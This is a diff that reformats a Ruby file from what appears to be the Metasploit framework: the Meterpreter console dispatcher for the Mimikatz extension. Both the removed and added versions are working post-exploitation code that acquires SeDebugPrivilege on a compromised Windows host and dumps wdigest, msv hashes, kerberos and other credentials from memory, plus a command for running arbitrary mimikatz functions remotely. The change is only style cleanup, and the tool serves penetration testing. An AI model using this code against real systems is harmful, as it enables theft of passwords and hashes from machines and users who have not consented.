@@ -1,182 +1,176 @@
+# frozen_string_literal: true
 # -*- coding: binary -*-
 require 'rex/post/meterpreter'
 
 module Rex
-module Post
-module Meterpreter
-module Ui
+  module Post
+    module Meterpreter
+      module Ui
+        ###
+        #
+        # Mimikatz extension - grabs credentials from windows memory.
+        #
+        # Benjamin DELPY `gentilkiwi`
+        # http://blog.gentilkiwi.com/mimikatz
+        #
+        # extension converted by Ben Campbell (Meatballs)
+        ###
+        class Console::CommandDispatcher::Mimikatz
+          Klass = Console::CommandDispatcher::Mimikatz
 
-###
-#
-# Mimikatz extension - grabs credentials from windows memory.
-#
-# Benjamin DELPY `gentilkiwi`
-# http://blog.gentilkiwi.com/mimikatz
-#
-# extension converted by Ben Campbell (Meatballs)
-###
-class Console::CommandDispatcher::Mimikatz
+          include Console::CommandDispatcher
 
-  Klass = Console::CommandDispatcher::Mimikatz
+          #
+          # Initializes an instance of the priv command interaction.
+          #
+          def initialize(shell)
+            super
+            if (client.arch == ARCH_X86) && (client.sys.config.sysinfo['Architecture'] == ARCH_X64)
+              print_line
+              print_warning "Loaded x86 Mimikatz on an x64 architecture."
+            end
+          end
 
-  include Console::CommandDispatcher
+          #
+          # List of supported commands.
+          #
+          def commands
+            {
+              "mimikatz_command" => "Run a custom command",
+              "wdigest" => "Attempt to retrieve wdigest creds",
+              "msv" => "Attempt to retrieve msv creds (hashes)",
+              "livessp" => "Attempt to retrieve livessp creds",
+              "ssp" => "Attempt to retrieve ssp creds",
+              "tspkg" => "Attempt to retrieve tspkg creds",
+              "kerberos" => "Attempt to retrieve kerberos creds"
+            }
+          end
 
-  #
-  # Initializes an instance of the priv command interaction.
-  #
-  def initialize(shell)
-    super
-    if client.arch == ARCH_X86 and client.sys.config.sysinfo['Architecture'] == ARCH_X64
-      print_line
-      print_warning "Loaded x86 Mimikatz on an x64 architecture."
-    end
-  end
+          @@command_opts = Rex::Parser::Arguments.new(
+            "-f" => [true, "The function to pass to the command."],
+            "-a" => [true, "The arguments to pass to the command."],
+            "-h" => [false, "Help menu."]
+          )
 
-  #
-  # List of supported commands.
-  #
-  def commands
-    {
-      "mimikatz_command" => "Run a custom command",
-      "wdigest" => "Attempt to retrieve wdigest creds",
-      "msv" => "Attempt to retrieve msv creds (hashes)",
-      "livessp" => "Attempt to retrieve livessp creds",
-      "ssp" => "Attempt to retrieve ssp creds",
-      "tspkg" => "Attempt to retrieve tspkg creds",
-      "kerberos" => "Attempt to retrieve kerberos creds"
-    }
-  end
+          def cmd_mimikatz_command(*args)
+            args.unshift("-h") if args.empty?
 
-  @@command_opts = Rex::Parser::Arguments.new(
-    "-f" => [true, "The function to pass to the command."],
-    "-a" => [true, "The arguments to pass to the command."],
-    "-h" => [false, "Help menu."]
-  )
+            cmd_args = nil
+            cmd_func = nil
+            arguments = []
 
-  def cmd_mimikatz_command(*args)
-    if (args.length == 0)
-      args.unshift("-h")
-    end
+            @@command_opts.parse(args) do |opt, _idx, val|
+              case opt
+              when "-a"
+                cmd_args = val
+              when "-f"
+                cmd_func = val
+              when "-h"
+                print(
+                  "Usage: mimikatz_command -f func -a args\n\n" \
+                  "Executes a mimikatz command on the remote machine.\n" \
+                  "e.g. mimikatz_command -f sekurlsa::wdigest -a \"full\"\n" +
+                  @@command_opts.usage
+                )
+                return true
+              end
+            end
 
-    cmd_args = nil
-    cmd_func = nil
-    arguments = []
+            unless cmd_func
+              print_error("You must specify a function with -f")
+              return true
+            end
 
-    @@command_opts.parse(args) { |opt, idx, val|
-      case opt
-        when "-a"
-          cmd_args = val
-        when "-f"
-          cmd_func = val
-        when "-h"
-          print(
-            "Usage: mimikatz_command -f func -a args\n\n" +
-            "Executes a mimikatz command on the remote machine.\n" +
-            "e.g. mimikatz_command -f sekurlsa::wdigest -a \"full\"\n" +
-            @@command_opts.usage)
-          return true
+            arguments = cmd_args.split(" ") if cmd_args
+
+            print_line client.mimikatz.send_custom_command(cmd_func, arguments)
+          end
+
+          def mimikatz_request(provider, method)
+            get_privs
+            print_status("Retrieving #{provider} credentials")
+            accounts = method.call
+
+            table = Rex::Text::Table.new(
+              'Header' => "#{provider} credentials",
+              'Indent' => 0,
+              'SortIndex' => 4,
+              'Columns' =>
+              [
+                'AuthID', 'Package', 'Domain', 'User', 'Password'
+              ]
+            )
+
+            accounts.each do |acc|
+              table << [acc[:authid], acc[:package], acc[:domain], acc[:user], (acc[:password] || "").delete("\n")]
+            end
+
+            print_line table.to_s
+
+            true
+          end
+
+          def cmd_wdigest(*_args)
+            method = proc { client.mimikatz.wdigest }
+            mimikatz_request("wdigest", method)
+          end
+
+          def cmd_msv(*_args)
+            method = proc { client.mimikatz.msv }
+            mimikatz_request("msv", method)
+          end
+
+          def cmd_livessp(*_args)
+            method = proc { client.mimikatz.livessp }
+            mimikatz_request("livessp", method)
+          end
+
+          def cmd_ssp(*_args)
+            method = proc { client.mimikatz.ssp }
+            mimikatz_request("ssp", method)
+          end
+
+          def cmd_tspkg(*_args)
+            method = proc { client.mimikatz.tspkg }
+            mimikatz_request("tspkg", method)
+          end
+
+          def cmd_kerberos(*_args)
+            method = proc { client.mimikatz.kerberos }
+            mimikatz_request("kerberos", method)
+          end
+
+          def get_privs
+            if system_check
+              print_good("Running as SYSTEM")
+            else
+              print_status("Attempting to getprivs")
+              privs = client.sys.config.getprivs
+              if privs.include? "SeDebugPrivilege"
+                print_good("Got SeDebugPrivilege")
+              else
+                print_warning("Did not get SeDebugPrivilege")
+              end
+            end
+          end
+
+          def system_check
+            unless client.sys.config.getuid == "NT AUTHORITY\\SYSTEM"
+              print_warning("Not currently running as SYSTEM")
+              return false
+            end
+
+            true
+          end
+
+          #
+          # Name for this dispatcher
+          #
+          def name
+            "Mimikatz"
+          end
+        end
       end
-    }
-
-    unless cmd_func
-      print_error("You must specify a function with -f")
-      return true
-    end
-
-    if cmd_args
-      arguments = cmd_args.split(" ")
-    end
-
-    print_line client.mimikatz.send_custom_command(cmd_func, arguments)
-  end
-
-  def mimikatz_request(provider, method)
-    get_privs
-    print_status("Retrieving #{provider} credentials")
-    accounts = method.call
-
-    table = Rex::Text::Table.new(
-      'Header' => "#{provider} credentials",
-      'Indent' => 0,
-      'SortIndex' => 4,
-      'Columns' =>
-      [
-        'AuthID', 'Package', 'Domain', 'User', 'Password'
-      ]
-    )
-
-    accounts.each do |acc|
-      table << [acc[:authid], acc[:package], acc[:domain], acc[:user], (acc[:password] || "").gsub("\n","")]
-    end
-
-    print_line table.to_s
-
-    return true
-  end
-
-  def cmd_wdigest(*args)
-    method = Proc.new { client.mimikatz.wdigest }
-    mimikatz_request("wdigest", method)
-  end
-
-  def cmd_msv(*args)
-    method = Proc.new { client.mimikatz.msv }
-    mimikatz_request("msv", method)
-  end
-
-  def cmd_livessp(*args)
-    method = Proc.new { client.mimikatz.livessp }
-    mimikatz_request("livessp", method)
-  end
-
-  def cmd_ssp(*args)
-    method = Proc.new { client.mimikatz.ssp }
-    mimikatz_request("ssp", method)
-  end
-
-  def cmd_tspkg(*args)
-    method = Proc.new { client.mimikatz.tspkg }
-    mimikatz_request("tspkg", method)
-  end
-
-  def cmd_kerberos(*args)
-    method = Proc.new { client.mimikatz.kerberos }
-    mimikatz_request("kerberos", method)
-  end
-
-  def get_privs
-    unless system_check
-      print_status("Attempting to getprivs")
-      privs = client.sys.config.getprivs
-      unless privs.include? "SeDebugPrivilege"
-        print_warning("Did not get SeDebugPrivilege")
-      else
-        print_good("Got SeDebugPrivilege")
-      end
-    else
-      print_good("Running as SYSTEM")
     end
   end
-
-  def system_check
-    unless (client.sys.config.getuid == "NT AUTHORITY\\SYSTEM")
-      print_warning("Not currently running as SYSTEM")
-      return false
-    end
-
-    return true
-  end
-
-  #
-  # Name for this dispatcher
-  #
-  def name
-    "Mimikatz"
-  end
 end
-
-end
-end
-end
-end
-
